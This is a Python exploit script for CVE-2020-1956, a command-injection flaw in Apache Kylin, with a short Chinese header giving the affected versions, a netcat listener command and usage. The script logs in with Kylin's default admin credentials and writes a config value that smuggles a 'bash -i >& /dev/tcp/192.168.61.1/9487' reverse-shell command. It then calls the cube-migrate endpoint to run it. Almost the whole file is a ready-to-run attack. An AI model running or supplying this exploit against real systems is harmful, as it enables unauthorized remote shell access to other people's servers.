'''
CVE-2020-1956
受影響的版本Apache Kylin < 2.6.6 >= 3.0.0, < 3.0.2
接收:shell nc -lvvp 9487
測試:python3 CVE-2020-1956_v2.0.py http://host
來源:https://iter01.com/552242.html
備註:所用到IP、PORT依個人環境調整，僅供環境漏洞測試
'''
from fake_useragent import UserAgent
import sys
import base64
import json
import requests
requests.packages.urllib3.disable_warnings()

def produce_Basic(username,password):
    s=username+':'+password
    ba=base64.b64encode(s.encode(encoding="utf-8"))
    return ba.decode()

def run(session,ip):
    curl=ip+'/kylin/api/cubes/'
    ua = UserAgent()
    s=session.get(curl,verify=False).json()[1]
    cube=s['name']
    project=s['project']
    rurl=ip+'/kylin/api/cubes/'+cube+'/'+project+'/'+'migrate'
    rr=session.post(rurl)
    return rr 

def Login(ip):
    url=ip+'/kylin/api/user/authentication'
    ua = UserAgent()
    header={
    'User-Agent':str(ua.chrome),
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': ip+'/kylin/login',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'Authorization': 'Basic '+produce_Basic(username,password),
    'Content-Type': 'application/json;charset=utf-8',
    'Content-Length': '2',
    'Cookie': 'project=null',
    'Connection': 'close',
    }
    try:
        session = requests.Session()
        session.post(url,headers = header,verify=False)
        return session
    except:
        return False

def exp_bash(session,ip):
    c=run(session,ip)
    feature='Source configuration should not be empty.'
    if (c.status_code==500 and c.text.find(feature)>0) or c.status_code==200:
        curl=ip+'/kylin/api/admin/config'
        ua = UserAgent()
        header={
        'User-Agent':str(ua.chrome),
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': ip+'/kylin/admin',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Content-Type': 'application/json;charset=utf-8',
        'Content-Length': '122',
        'Cookie': 'project=null; JSESSIONID='+dict(session.cookies)['JSESSIONID'],
        'Connection': 'close'
        }
        data1={"key":"kylin.tool.auto-migrate-cube.src-config","value":"/home/admin/apachekylin-3.0.1-bin-hbase1x/conf/kylin.propertie"}       
        session.put(curl,headers = header,data=json.dumps(data1),verify=False)    	
        data2={"key":"kylin.tool.auto-migrate-cube.dest-config","value":"/tmp/kylin.properties kylin_sales_cube learn_kylin truetrue true true; bash -i >& /dev/tcp/192.168.61.1/9487 0>&1; echo ; "}
        session.put(curl,headers = header,data=json.dumps(data2),verify=False)    
        c=run(session,ip)
        if c.status_code==200:
            print('[OK]')
        else:
            print('[ERROR]There is no such loophole')
    else:
        print('No loopholes')
        
if __name__== "__main__":
    username='admin'
    password='KYLIN'
    ip = sys.argv[1]
    ss=Login(ip)
    if not isinstance(ss, bool):
        exp_bash(ss,ip)
    else:
        print('Account or password ERROR')